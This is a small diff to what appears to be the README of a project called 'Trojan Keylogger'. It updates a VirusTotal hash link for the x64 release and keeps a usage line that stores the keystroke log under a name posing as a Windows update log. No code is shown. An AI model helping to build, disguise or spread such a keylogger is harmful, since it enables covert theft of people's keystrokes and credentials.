@@ -4,7 +4,7 @@
 Trojan Keylogger
 
 VIRUSTOTAL: 
-Keylogger Release x64: https://www.virustotal.com/gui/file/7947acb546ca6788237217948e0b8e1df64ae50dcb10b92a556d031685804905/
+Keylogger Release x64: https://www.virustotal.com/gui/file/30fc025e411943bd214c10c6029947a1250d57cff3644fdd29520c4f2065bb86
 
 USAGE:
 Store the Logfile in %userprofile%\win_update_r.log
